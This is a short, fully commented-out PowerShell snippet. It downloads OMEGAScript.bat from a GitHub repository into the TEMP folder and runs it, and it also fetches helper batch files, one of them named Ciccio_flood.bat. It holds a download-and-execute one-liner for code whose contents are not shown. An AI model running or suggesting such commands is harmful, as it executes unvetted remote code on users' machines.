// powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/alpha840x/Omega_Script/main/OMEGAScript.bat' -OutFile '%TEMP%\OMEGAScript.bat'; Start-Process '%TEMP%\OMEGAScript.bat'"
/*$tempFolder = "$env:TEMP\OmegaFiles"
New-Item -ItemType Directory -Path $tempFolder -Force

# Download the main file and run it
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/alpha840x/Omega_Script/main/OMEGAScript.bat' -OutFile "$tempFolder\OMEGAScript.bat"
Start-Process "$tempFolder\OMEGAScript.bat"

# Download the helper files (do not run them)
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/alpha840x/Omega_Script/refs/heads/main/Ciccio_flood.bat' -OutFile "$tempFolder\Ciccio_flood.bat"

Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/alpha840x/Omega_Script/refs/heads/main/folder.bat' -OutFile "$tempFolder\folder.bat"

